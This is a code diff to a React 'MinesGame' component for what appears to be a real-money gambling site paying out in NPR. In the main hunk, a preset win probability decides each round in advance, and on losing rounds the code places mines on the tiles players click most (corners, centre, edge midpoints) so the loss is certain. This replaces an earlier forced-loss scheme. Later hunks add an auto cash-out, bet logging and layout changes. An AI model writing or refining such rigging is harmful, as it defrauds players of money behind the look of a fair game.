@@ -105,21 +105,51 @@ export const MinesGame = () => {
 
     const winProb = await getWinProbability('mines', user?.id);
     const shouldWin = Math.random() < winProb;
+    
+    console.log(`Mines: Win probability ${winProb}, shouldWin: ${shouldWin}`);
 
     await updateBalance(-betAmount);
 
     const minePositions = new Set<number>();
     
     if (!shouldWin) {
-      const earlyPositions = Array.from({ length: Math.min(15, totalTiles) }, (_, i) => i);
-      const shuffled = earlyPositions.sort(() => Math.random() - 0.5);
-      for (let i = 0; i < Math.min(effectiveMineCount, shuffled.length); i++) {
-        minePositions.add(shuffled[i]);
+      // Force loss: Place mines in common click positions (corners, center, edges)
+      const commonPositions: number[] = [];
+      
+      // Add corners first (most common clicks)
+      commonPositions.push(0); // top-left
+      commonPositions.push(gridCols - 1); // top-right
+      commonPositions.push(totalTiles - gridCols); // bottom-left
+      commonPositions.push(totalTiles - 1); // bottom-right
+      
+      // Add center positions
+      const centerRow = Math.floor(gridCols / 2);
+      const centerIdx = Math.floor(totalTiles / 2);
+      commonPositions.push(centerIdx);
+      if (gridCols % 2 === 0) {
+        commonPositions.push(centerIdx - 1);
       }
+      
+      // Add edge midpoints
+      commonPositions.push(Math.floor(gridCols / 2)); // top edge
+      commonPositions.push(totalTiles - Math.floor(gridCols / 2) - 1); // bottom edge
+      
+      // Shuffle common positions and place mines there
+      const shuffledCommon = [...new Set(commonPositions)].sort(() => Math.random() - 0.5);
+      
+      for (const pos of shuffledCommon) {
+        if (minePositions.size >= effectiveMineCount) break;
+        if (pos >= 0 && pos < totalTiles) {
+          minePositions.add(pos);
+        }
+      }
+      
+      // Fill remaining mines randomly
       while (minePositions.size < effectiveMineCount) {
         minePositions.add(Math.floor(Math.random() * totalTiles));
       }
     } else {
+      // Allow fair chance: place mines randomly
       while (minePositions.size < effectiveMineCount) {
         minePositions.add(Math.floor(Math.random() * totalTiles));
       }
@@ -170,6 +200,29 @@ export const MinesGame = () => {
       setRevealedCount(newRevealed);
       const newMultiplier = calculateMultiplier(newRevealed, effectiveMineCount, totalTiles);
       setCurrentMultiplier(newMultiplier);
+      
+      // Auto cash out when all safe tiles revealed
+      const safeSpots = totalTiles - effectiveMineCount;
+      if (newRevealed >= safeSpots) {
+        const payout = betAmount * newMultiplier;
+        updateBalance(payout).then(() => {
+          triggerWinConfetti();
+          toast.success(`🎉 All diamonds found! Won NPR ${payout.toFixed(2)}!`);
+        });
+        
+        supabase.from('bet_logs').insert({
+          user_id: profile?.id,
+          game: 'mines',
+          bet_amount: betAmount,
+          won: true,
+          payout: payout
+        });
+        
+        setGrid(grid.map(t => ({ ...t, revealed: true })));
+        setGameActive(false);
+        setGameOver(true);
+        refreshProfile();
+      }
     }
   };
 
@@ -317,7 +370,7 @@ export const MinesGame = () => {
               <Grid3X3 className="w-4 h-4" />
               Grid Size
             </Label>
-            <div className="grid grid-cols-3 gap-2">
+            <div className="grid grid-cols-3 gap-1">
               {(['small', 'medium', 'large'] as GridSize[]).map((size) => (
                 <Button
                   key={size}
@@ -328,9 +381,9 @@ export const MinesGame = () => {
                     setMineCount(Math.min(mineCount, GRID_CONFIG[size].maxMines));
                   }}
                   disabled={gameActive}
-                  className="text-xs capitalize"
+                  className="text-[10px] sm:text-xs px-1 py-1 h-auto whitespace-nowrap"
                 >
-                  {size} ({GRID_CONFIG[size].cols}x{GRID_CONFIG[size].cols})
+                  {GRID_CONFIG[size].cols}x{GRID_CONFIG[size].cols}
                 </Button>
               ))}
             </div>
